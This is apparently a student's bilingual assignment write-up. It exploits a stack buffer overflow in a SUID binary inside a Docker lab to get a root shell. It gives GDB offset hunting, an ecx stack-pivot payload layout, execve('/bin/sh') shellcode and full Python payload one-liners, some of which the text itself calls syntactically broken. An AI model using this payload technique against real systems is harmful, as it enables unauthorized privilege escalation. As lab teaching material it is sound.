# buffer-overflow-practice
4th Year Information Security Assignment about buffer overflow

## Table of Contents

- [Docker Environment](#)
- [Kernel Space / User Space](#kernel-space--user-space)
- [gdb execute](#gdb-execute)
    - [Before Executing `strcpy`](#before-executing-strcpy)
    - [After Executing `strcpy`](#after-executing-strcpy)
- [Adequate Length of "A"](#adequate-length-of-a)
- [Exploit Payload](#exploit-payload)
- [Trouble Shooting](#trouble-shooting)

> For Korean
- [Korean Ver.](#korean-ver)

---

### Docker Environment

This environment is running inside an Ubuntu x86 32-bit container, built on top of an Ubuntu AMD64 base Docker image.

To spin up the container environment, run the following commands:

```bash
sudo docker compose up -d

sudo docker exec -it ubuntu_x86_32 /bin/bash

```

Now, you can safely proceed with the buffer overflow practice inside the interactive container shell.

---

### Kernel Space / User Space

```
0xFFFFFFFF  ┌─────────────────────┐
            │                     │
            │    Kernel Space     │  1GB (Kernel space, inaccessible from User space)
            │                     │
0xC0000000  ├─────────────────────┤  ← Boundary Line (3GB)
            │   User Stack        │  ↓ Grows down
            │      ...            │
            │   Shared Libraries  │  (mmap region for libc, etc.)
            │      ...            │
            │   Heap              │  ↑ Grows up
            │   BSS               │
            │   Data              │
            │   Text (Code)       │
0x08048000  ├─────────────────────┤  ← Standard ELF Loading Address
            │   (Unused)          │
0x00000000  └─────────────────────┘  ← NULL (Inaccessible)

```

---

### GDB Execution

First, execute the vulnerable binary with a large input to trigger a Segmentation Fault.

As shown above, feeding a 300-byte string of "A"s successfully triggers a segmentation fault. Next, we analyze the binary using GDB to find out exactly how much data is required to overflow the buffer and overwrite the return address.

#### Before Executing `strcpy`

The following state shows execution paused right before the vulnerable section. (Note: some characters in the terminal display may appear corrupted).

Executing `nexti` moves the execution forward. In this 32-bit Ubuntu system, the stack grows downward toward lower memory addresses, and the local variable `char buffer[256]` is allocated within the `main` stack frame.

Our analytical focus for the `main` stack frame relies on two key principles:

1. Overwriting the **return address** allows us to hijack control flow and redirect execution to an arbitrary memory address.
2. If the payload overflows beyond the permitted stack boundaries into unmapped regions, a **Segmentation Fault** will occur, terminating the process.

Given that a 300-byte string is being copied into a 256-byte buffer, it is highly likely that critical stack pointers are being corrupted. Let's inspect the registers post-execution.

#### After Executing `strcpy`

The register state changes significantly after the execution of `strcpy`.

Once `strcpy` finishes, its individual stack frame clears, and control shifts back to the `main` stack frame. Because 300 bytes of "A"s were copied into `buffer`, the payload spilled into the **Saved EBP** area of `main`, completely overwriting it with `0x41414141`.

To find the precise offset needed to control the return address without unnecessarily destroying adjacent memory structures, we can substitute "A"s with distinct character sequences (like "B", "C", etc.) and observe exactly where the values shift.

---

### Determining the Adequate Length of "A"

At the assembly level, space for local variables is reserved at the very beginning of the function prologue. For a `buffer[256]` declaration, the compiler allocates corresponding stack space. We can verify the precise allocation size by analyzing the assembly instructions.

Right before calling `strcpy`, the following instruction appears:

```c
lea    eax,[ebp-0x118]

```

This instruction loads the address of the local buffer into `eax` to pass it as the destination argument for `strcpy`. It pushes `eax` right before making the function call:

```c
lea    eax, [ebp-0x118]  ; eax = local stack buffer (0x118 = 280 bytes)
push   eax               ; 1st argument: dst = local buffer
call   strcpy@plt        ; strcpy(buf, argv[1])

```

This confirms that the buffer allocation size is `0x118` (280 bytes) instead of exactly 256. This padding is due to compiler stack alignment. We can now infer the distance to the **Saved EBP** and **Return Address**.

The image above shows the stack after being overwritten with exactly 280 "A"s. Let's compare this with the 300 "A"s execution register state:

Below is the register state when passing 280 characters:

Looking closely at `ebp`, the value for 280 "A"s reads `0       0` due to corruption. Even though we sent exactly 280 bytes, `strcpy` appends a null terminator (`\0`), meaning 281 bytes were actually written to the stack. This single null byte overflowed into the lowest byte of the EBP register.

To confirm our offset math, let's inject a distinct trailing string:

```python
run $(python3 -c 'print("A" * 280 + "ABCD")')

```

If our calculation is correct, the `ebp` register after `strcpy` should hold the value `0x44434241` ("DCBA" in Little-Endian format).

Now that the exact offset is verified, we can construct an exploit structure by placing a NOP sled and shellcode within the buffer, overwriting the return address with the address pointing to our shellcode:

```
Low <- [NOP sled + shellcode (280B)] [saved EBP (4B)] [return address (4B)] -> High

```

---

### Exploit Payload

To verify control flow redirection, we first test a baseline structural payload:

```python
run $(python3 -c 'print("A" * 280 + "ABCD" + "DDDD")')

```

Let's execute the binary with this payload.

The image above shows the state before the function call.

After execution, an anomaly appears: `esp` points to `0x4141413d`. Because we appended `DDDD`, we expected `esp` to jump elsewhere, or at least match `0x41414141`.

To understand why `esp` lands on `0x4141413d`, we must examine the function epilogue assembly instructions.

---

### Troubleshooting

```bash
disas main

```

Inspecting the disassembly of `main` right before the `ret` instruction reveals the following sequence:

```bash
   │0x56555622 <main+117>   add    esp,0x10
   │0x56555625 <main+120>   mov    eax,0x0
   │0x5655562a <main+125>   lea    esp,[ebp-0xc]
   │0x5655562d <main+128>   pop    ecx          
   │0x5655562e <main+129>   pop    ebx          
   │0x5655562f <main+130>   pop    esi          
   │0x56555630 <main+131>   pop    ebp          
   │0x56555631 <main+132>   lea    esp,[ecx-0x4]
  >│0x56555634 <main+135>   ret      

```

Notice that right before `ret`, the instruction `lea esp, [ecx-0x4]` is executed. This is a stack alignment recovery mechanism that restores the original stack pointer using `ecx`.

We can reverse-engineer this behavior: if we corrupt the stack area that gets popped into `ecx`, we can control `esp`. The value `0x4141413d` is the direct result of `0x41414141 - 0x4`.

Therefore, the exploit payload layout must pivot around this stack-alignment routine:

```
Low <- [NOP sled (264B)] [ecx-4 slot (4B)] [ecx (4B)] [NOP×8] [shellcode] -> High

```

To pinpoint exactly which part of our input string populates `ecx` under normal conditions, we pass a unique pattern string:

```bash
run $(python3 -c 'print("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiiABCD")')

```

Let's check where `esp` points after running this pattern:

The register state indicates that the crash targets the "h" character sequence. To find the exact byte alignment, we swap "hhhhhhhh" with "ABCDEFGH":

```bash
run $(python3 -c 'print("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffggggggggABCDEFGHiiiiiiiiABCD")')

```

The exact match is located at offset 268 (the character sequence right after 'g'). This means offset 268 directly controls the `ecx` register. During the epilogue execution, the instruction `*(ecx-4)` will evaluate to `*(buffer+264)` and serve as our execution redirect target.

The final payload design maps out as follows:

```
Offset 264 ~ 267 : Target address to jump to (★ becomes the destination for ret)
Offset 268 ~ 271 : Target value to be loaded into the ecx register
Offset 272 ~ 279 : NOP Padding (8 bytes)
Offset 280 ~     : Executable shellcode payload

```

By placing our buffer address `(buf + 268)` at offset 268, the `ecx` register receives `buf + 268`. When `lea esp, [ecx-4]` executes, `esp` points to `buf + 264`. The subsequent `ret` instruction pops the address stored at `buf + 264` into the `EIP` register. Since we placed `buf + 276` inside that slot, execution flows directly into our NOP sled at `buf + 276`, sliding straight into the shellcode at `buf + 280`.

We will use a standard 32-bit Linux local shellcode block that executes `execve("/bin/sh")`:

```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

```

Because x86 32-bit systems utilize **Little-Endian** byte ordering, multi-byte memory addresses must be written in reverse-byte order. We use Python's built-in `struct` module to guarantee proper byte packaging:

```bash
run "$(python3 -c '
import sys, struct; \
buf = 0xffffd560; \
sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; \
p = b"\x90" * 264 + \
    struct.pack("<I", buf + 276) + \
    struct.pack("<I", buf + 268) + \
    b"\x90" * 8 + sc; \
sys.stdout.buffer.write(p)' \
)"

```

| Offset | Content | Role |
| --- | --- | --- |
| 0 ~ 263 | `\x90` × 264 | NOP Sled |
| 264 ~ 267 | `buf + 276` | Slot read by `*(ecx-4)`, loaded into EIP |
| 268 ~ 271 | `buf + 268` | Target `ecx` value (used by `lea esp, [ecx-4]`) |
| 272 ~ 279 | `\x90` × 8 | NOP Padding |
| 280 ~ | Shellcode | `execve("/bin/sh")` payload body |

Executing this initial payload yields the following output:

The application crashed because expanding the `argv[1]` argument size pushed environmental variables higher up on the stack, slightly shifting the absolute base address of `buffer`.

The debugger output reveals that execution tried jumping to `0x8953e289`, which aligns perfectly with the raw shellcode bytes `\x89\xe2\x53\x89`.

To fix this offset shift, we readjust our target base address pointer down to `0xffffd540`:

```bash
run "$(python3 -c 'import sys,struct; buf=0xffffd540; \
sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; \
p = b"\x90" * 264 + \
    struct.pack("<I", buf + 276) + \
    struct.pack("<I", buf + 268) + \
    b"\x90" * 8 + sc; \
sys.stdout.buffer.write(p)')"

```

The modified payload successfully executes, spawning a root shell.

```bash
whoami

```

Because the binary was compiled with the SUID bit enabled, executing `execve("/bin/sh")` retains the elevated privileges of the binary owner rather than dropping back down to our standard unprivileged user account (`seonghun...`), achieving full privilege escalation.


---

# Korean Ver.

### Docker Environment

본 설명은 Docker 의 Ubuntu AMD 기반 이미지를 따와서 거기에 Docker 를 설치하여 ubuntu x86 32 bit 기반의 컨테이너 내부에서 실행한 결과입니다.

[Docker 설치 방법](https://docs.docker.com/engine/install/ubuntu/)

ubuntu 운영체제에서 다음을 실행하면 됩니다.

```bash
sudo docker compose up -d

sudo docker exec -it ubuntu_x86_32 /bin/bash
```

이제 해당 컨테이너에서 buffer overflow 를 실습하면 됩니다.

### Kernel Space / User Space

```
0xFFFFFFFF  ┌─────────────────────┐
            │                     │
            │    Kernel Space     │  1GB (커널 전용, 유저 접근 불가)
            │                     │
0xC0000000  ├─────────────────────┤  ← 경계선 (3GB)
            │   User Stack        │  ↓ grows down
            │      ...            │
            │   Shared Libraries  │  (libc 등 mmap 영역)
            │      ...            │
            │   Heap              │  ↑ grows up
            │   BSS               │
            │   Data              │
            │   Text (Code)       │
0x08048000  ├─────────────────────┤  ← 일반적인 ELF 로드 주소
            │   (미사용)           │
0x00000000  └─────────────────────┘  ← NULL (접근 불가)
```

### gdb execute

우선 취약점 코드를 실행하여 segment fault 를 띄워본다.

![segment fault](./img/segment_fault.png)

위 사진처럼 "A" 문자열 300개를 넣어 segment fault 를 띄웠다. 취약점이 있는 코드를 디버깅을 하여 얼마나 overflow 를 해야 return 주소를 침범할 수 있는지 살피기 위해 위 명령을 실행했다.

#### Before Executing `strcpy`

아래 사진은 취약점이 없는 구간까지 다 실행한 상태이다. 터미널의 문자열들이 깨지는 점 양해바란다.

![before strcpy](img/before_execute_strcpy.png)

이 지점에서 `nexti` 를 다시 실행해보자. 현재 32 비트 우분투 체제에서는 기본적으로 RAM 은 Low 로 Stack 이 자라나고, `char buffer[256]` 라는 local parameter 는 `main` stackframe 에 어떤 곳에 자리잡을 것이다. 아래는 그에 대한 스케치다.

위처럼 우리는 Main Stackframe 에 대해서

1. return 값을 바꾸면 우리가 원하는 함수로의 실행이 가능하게 된다.
2. 다만 Main Stackframe 을 넘어서는 공간을 침범할 경우 Segmentation Fault 가 떠서 프로세스는 종료가 돤다.

현재는 2번의 상황일 가능성이 높다 ~~256바이트짜리 버퍼에 300바이트 문자열이 들어가기 때문~~ 계속 실행해보자.

#### After Executing `strcpy`

![after_strcpy](img/after_strcpy.png)

위처럼 바뀌었다.

`strcpy` 함수 호출이 끝나면 esp는 `strcpy` 의 스택프레임이 정리되면서 main의 스택프레임으로 돌아오게 된다. 이때 `strcpy` 의 인자였던 `buffer` 에 300개의 "A"가 들어가면서 main의 saved EBP 영역까지 침범하여 `0x41414141` 로 덮어쓰게 된다.

이때 Main 의 지역 변수로 선언되었던 `buffer` 에 300 개의 "A" 가 들어가게 되면서 Main 의 ebp 가 가르키는 부분에 "A" * 4 로 오염시키게 된다. 따라서 이 값이 `0x41414141` 가 됨을 볼 수 있다.

"A" 문자열의 개수를 조절해가면서 적당한 수치를 찾아 buffer overflow 를 성공해보자. 우선은 `"A" = 0x41` 인데, 다른 characater 인 "B" 를 사용하여 어디 부분에서 `0x42` 로 될지 그 수치를 찾자.

### Adequate Length of "A"

기본적으로 어셈블리 수준에서는 지역 변수를 먼저 할당시켜놓고 함수를 실행하기 위한 준비를 하게 된다. 따라서 buffer 256 이라는 수치에서 256 byte 를 할당시켰을 것이다. 이 수치를 정확히 알기 위해 어셈블리어를 해석해서 찾아볼 수 있다.

![asm_lang](img/asm_lang.png)

`strcpy` 이전에는 

```c
lea    eax,[ebp-0x118]
```

위와 같은 명령어가 있음을 볼 수 있다. 이는 `strcpy` 전에 두번째 인자를 할당하기 위해 buffer 지역 변수를 들고오는 과정이다. 이 명령 후에 곧바로 push 를 하여서 buffer 의 첫번째를 가르키는 주소를 push 하게 된다. 정리하면 다음과 같다:

```c
lea    eax, [ebp-0x118]  ; eax = 스택의 로컬 버퍼 (0x118 = 280바이트)
push   eax               ; 1번째 인자: dst = 로컬 버퍼
call   strcpy@plt        ; strcpy(buf, argv[1]) 호출, argv[1] 의 준비과정은 그 위에 있음
```

이를 툥해 `saved EBP`, `return address` 를 덮어씌울 수 있게 되고, `0x118` 은 280 과도 같다. 이제 main 에 얼마나 문자를 써야 `return address` 전까지 갈 수 있을지 추측이 가능하다.

![280 "A" overwrite](img/280_A_overwrite.png)

위는 280 개의 A 를 overwrite 한 결과다. 아까의 결과와 차이점을 보자.

![300 "A" registers](img/300_A_registers.png)

위는 300 개의 "A" 를 넣을 때다.

![280 "A" registers](img/280_A_registers.png)

위는 280 개의 character 를 넣고 `strcpy` 실행 후의 Registers 를 출력해본 결과다. 유심히 볼 곳은 `ebp` 이다. 280 의 ebp 는 조금 깨졌지만 `0       0` 처럼 되어 있다. 이 이유는 손상되어서 그런데, "A" * 280 뒤에는 "\0" 의 값이 암묵적으로 들어가게 된다. 따라서 사실은 281 개의 문자가 스택에 쌓이게 되는데, 그 "\0" 이 EBP 영역을 침범한 것이다. 이게 맞는지 확인하기 위해 추가적인 문자열을 넣어보자.

```python
run $(python3 -c 'print("A" * 280 + "ABCD")')
```

우리의 예상대로라면 ebp 에는 strcpy 호출 후에 `0x44434241` 가 와야 한다.

![alt text](img/ABCD_ebp.png) ![alt text](img/ABCD_regs.png)

이제 버퍼 안에 셸코드를 삽입하고, return address를 셸코드가 위치한 스택 주소로 덮어씌울 수 있다.

다음처럼 하면 된다:

```
Low <- [NOP sled + shellcode (280B)] [saved EBP (4B)] [return address (4B)] -> High
```

### Exploit Payload

이제 위를 악용해서 Exploit Payload 를 짜야하는데, 이는 우선 의도한대로 돌아가는지 확인만 하기 위해서 간단하게만 짜자.

```python
run $(python3 -c 'print("A" * 280 + "ABCD" + "DDDD")')
```

이제 돌려보자.

![before execute strcpy exploit version](img/before_execute_exploit.png)

위는 호출 전이다.

![after execute strcpy exploit version](img/after_execute_exploit.png)

위 사진은 호출 후인데, 이상한 점이 보인다.

esp 가 `0x4141413d` 임을 알 수 있다. `DDDD` 를 넣었기 때문에 esp 가 이상한 대로 튀어야 할 것이며, 그렇지 않더라도 `0x41414141` 이 되어야 할 것이다.

왜 이렇게 되는지 알기 위해서 어셈블리어를 살펴보자.

### Trouble Shooting

```bash
disas main
```

위 명령어를 입력하면 메인을 쉽게 볼 수 있다.

ret 를 하기 전 명령어를 보자.

```bash
   │0x56555622 <main+117>   add    esp,0x10
   │0x56555625 <main+120>   mov    eax,0x0
   │0x5655562a <main+125>   lea    esp,[ebp-0xc]
   │0x5655562d <main+128>   pop    ecx          
   │0x5655562e <main+129>   pop    ebx          
   │0x5655562f <main+130>   pop    esi          
   │0x56555630 <main+131>   pop    ebp          
   │0x56555631 <main+132>   lea    esp,[ecx-0x4]
  >│0x56555634 <main+135>   ret      
```

잘 보면 `return` 하기 전에 esp 에다가 ecx 에서 `0x4` 를 빼서(substract) 불러오는 것을 볼 수 있다. 이는 함수가 시작되기 직전의 원래 esp(스택 포인터) 주소를 정확하게 복원하기 위한 수학적 역연산 과정이다. 우리는 이를 역이용하여 ecx 가 가르키는 `0x4141413d` 가 있는 곳을 찾아내어서 해당 문자열 부분을 수정시켜주면 될 것이다. 그리고 앞서 봤던 exploit payload 도 살짝 달라진다.

```
Low <- [NOP sled (264B)] [ecx-4 슬롯 (4B)] [ecx (4B)] [NOP×8] [shellcode] -> High
```

segmentation fault 가 일어나기 전에 정상 동작에서 ecx 가 어디를 가르키고 있는지를 보자.

```bash
run $(python3 -c 'print("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiiABCD")')
```

위를 쳐서 esp 가 어디를 가르키는지 보자.

![find esp](img/find_position_of_esp.png)

이로써 h 가 있는 곳임을 알 수 있다. 더 정확히 파악하기 위해 "hhhhhhhh" 를 "ABCDEFGH" 로 바꿔서 해보자.

```bash
run $(python3 -c 'print("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffggggggggABCDEFGHiiiiiiiiABCD")')
```

![alt text](<img/스크린샷 2026-05-30 오후 9.11.09.png>)

찾아냈다. 이는 offset 268 의 위치에(g 마지막 부분까지가 263) ecx 의 제어점이 된다는 소리이다. 이 이후에 ret 이전에 `*(ecx-4) = *(buffer+264)` 로 점프하게 됨을 알 수 있다.

다음과 같이 페이로드를 설계하면 된다:

```
offset 264 ~ 267 : 여기에 셸코드로 점프할 주소를 넣음 (★ ret의 점프 목적지가 됨)
offset 268 ~ 271 : 여기에 ecx 값을 넣음
offset 272 ~ 279 : NOP × 8 (패스 하도록)
offset 280 ~     : shellcode 본체
```

offset 268 에 본인 주소값 `(buf+268)` 을 넣어서 ecx 에는 `buf + 268` 이 들어가게 하고, 이후 `lea esp,[ecx-4]` 에 의해 esp 는 `buf + 264` 가 되고, ret 이 그 위치 `(buf+264)` 에 적혀있는 값을 EIP로 읽어간다. 그 자리에는 우리가 넣어둔 `buf + 276` 이 있으므로, EIP는 `buf + 276` 으로 점프하여 `NOP sled(\x90)` 를 미끄러져 내려와 셸코드를 실행하게 된다.

이제 여기다가 shell 를 넣기 위해 우리가 권한을 얻기 위한 코드를 크롬에서 검색해서 얻어보자. 크롬에서 다음 `ubuntu linux 32 bit shell code` 를 검색해서 권한 상승을 얻을 수 있는 코드를 얻을 수 있었다.

```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

이제 이를 payload 에 잘 담아 실행하면 된다. 이때 x86 의 32 비트 운영체제는 Little Endian 을 사용하기 때문에 넣을 때는 32bit 마다 역순으로 넣어야 한다.

이를 위해 python 의 `struct` 패키지를 사용하자(아래 파이썬 코드는 문법적으로 맞지 않습니다.. 수정 후에 사용 부탁드립니다..).

```bash
run "$(python3 -c '
import sys, struct; \
buf = 0xffffd560; \
sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; \
p = b"\x90" * 264 + \
    struct.pack("<I", buf + 276) + \ # buffer 로부터 276 바이트 떨어진 위치 주소값
    struct.pack("<I", buf + 268) + \
    b"\x90" * 8 + sc; \
sys.stdout.buffer.write(p)' \
)"
```
> `sys.stdout.buffer.write`: "\n" 을 붙이지 않고 출력, 바이너리 그대로 출력  
> "<": 리틀엔디안으로  
> "I": unsigned int
> 아래는 예시이다:  
>  
> `struct.pack("<I", 0xffffd544)` → `b"\x44\xd5\xff\xff"`

위 설명은 다음과 같다:

| offset    | 내용                  | 역할                                |
|-----------|----------------------|------------------------------------|
| 0 ~ 263   | `\x90` × 264         | NOP sled                           |
| 264 ~ 267 | `buf + 276`          | *(ecx-4) 가 읽는 슬롯, eip 로 들어감   |
| 268 ~ 271 | `buf + 268`          | ecx 값 (lea esp, [ecx-4] 가 사용)     |
| 272 ~ 279 | `\x90` × 8           | NOP 여유 패딩                       |
| 280 ~ | shellcode            | execve("/bin/sh") 실제 코드        |

`buf + 276` 을 슬롯에 넣은 이유는 `ecx = buf + 268` 로 두면 `lea esp,[ecx-4]` 결과 `esp` 가 `buf + 264` 를 가리킨다. 이후 ret 은 `*(esp)` 를 EIP 로 점프시키므로, 슬롯`(buf+264) 에 적힌 값 = buf + 276` 이 EIP가 된다. `buf + 276` 은 NOP 영역이라 미끄러져 셸코드 `buf + 280` 에 도달한다.

![fail1](/img/fail1.png)

실행했더니 다음과 같이 뜬다. 우리가 인자를 더 길게 써서 메모리 주소의 스택 시작 위치가 재조정 된 것이다. 인자 `argv[1]` 의 길이가 달라지면 그 위에 있는 환경변수 영역의 위치도 밀리고, 결국 buffer가 자리잡는 위치도 미세하게 바뀌게 된다.

해결하기 위한 핵심은 `0x8953e289`의 출력 결과다. 점프했던 addr. 가 `0x8953e289` 를 가르킨 것이다. 이는 공교롭게도 `sc` 변수에 선언했던 `\x89\xe2\x53\x89` 해당 위치에 있음을 알 수 있다.

그래서 `buf` 값을 조정해서 `0xffffd540` 으로 맞춰주자.

(아래 파이썬 코드는 문법적으로 맞지 않습니다.. 수정 후에 사용 부탁드립니다..)

```bash
run "$(python3 -c 'import sys,struct; buf=0xffffd540; \

sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; \

p = b"\x90" * 264 + \
    struct.pack("<I", buf + 276) + \
    struct.pack("<I", buf + 268) + \
    b"\x90" * 8 + sc;

sys.stdout.buffer.write(p)')"
```

![success](img/success.png)

위와 같이 권한이 높은 쉘에 접속한 것을 볼 수 있다.

```bash
whoami
```

위 코드를 쳐보자.

![whoami](img/success2.png)

바이너리에 SUID 비트가 설정되어 있어, execve("/bin/sh") 호출 시 소유자 권한의 셸이 실행되며 권한 탈취가 발생하며 원래 설정했던 user(seonghun...) 가 안나오고 권한 탈취에 성공한 것을 볼 수 있다.